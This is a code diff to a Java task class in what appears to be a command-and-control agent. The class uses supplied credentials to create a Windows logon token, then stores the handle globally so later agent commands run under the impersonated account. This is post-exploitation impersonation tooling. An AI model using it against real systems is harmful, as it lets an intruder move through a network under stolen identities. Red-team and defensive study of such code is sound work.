@@ -61,21 +61,24 @@ public class MakeTokenTask implements Task {
         }
         
         Config.debugLog(config, "Attempting to create token for: " + domain + "\\" + username + " (netOnly=" + netOnly + ")");
+        Config.debugLog(config, "Current user BEFORE make_token: " + WindowsAPI.getImpersonatedUsername());
         
-        // Create the token
-        String result = WindowsAPI.makeToken(username, password, domain, netOnly);
+        // Create the token and get the handle
+        com.woopsie.utils.WindowsAPI.TokenResult tokenResult = WindowsAPI.makeTokenWithHandle(username, password, domain, netOnly);
         
         Config.debugLog(config, "Token created successfully");
         
-        // Get current user context after impersonation
-        String newUsername = com.woopsie.utils.SystemInfo.getUsername();
-        String newDomain = com.woopsie.utils.SystemInfo.getDomain();
-        String impersonationContext = newDomain + "\\" + newUsername;
+        // Save the token handle globally so other commands can use it
+        com.woopsie.Agent.setImpersonationToken(tokenResult.token);
+        
+        // Get current user context after impersonation (use thread token check)
+        String impersonationContext = WindowsAPI.getImpersonatedUsername();
+        Config.debugLog(config, "Current user AFTER make_token: " + impersonationContext);
         
         // Return JSON with callback field containing impersonation_context (matches oopsie format)
         return String.format(
             "{\"user_output\": \"%s\", \"callback\": {\"impersonation_context\": \"%s\"}}",
-            result.replace("\\", "\\\\").replace("\"", "\\\""),
+            tokenResult.message.replace("\\", "\\\\").replace("\"", "\\\""),
             impersonationContext.replace("\\", "\\\\").replace("\"", "\\\"")
         );
     }
